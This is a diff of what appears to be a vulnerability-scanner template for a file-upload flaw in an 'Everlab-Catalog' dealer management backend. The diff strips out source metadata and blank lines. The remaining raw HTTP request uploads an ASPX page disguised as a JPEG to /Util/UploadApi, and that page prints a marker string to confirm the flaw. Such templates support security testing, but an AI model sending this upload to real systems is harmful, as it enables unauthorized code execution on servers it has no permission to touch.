@@ -3,12 +3,8 @@ info:
   name: Everlab-Catalog经销商管理后台文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pl3my7dz6g3451q1'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pl3my7dz6g3451q1
-    fofa: fid="eI+Xsoc7dLCgDaXFvOBCcg=="
 http:
 - raw:
   - 'POST /Util/UploadApi HTTP/1.1
@@ -35,8 +31,6 @@ http:
     Upgrade-Insecure-Requests: 1
 
 
-
-
     -----------------------------111
 
 
@@ -44,8 +38,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <%@ Page Language="C#"%><% Response.Write("dudesuite");%>
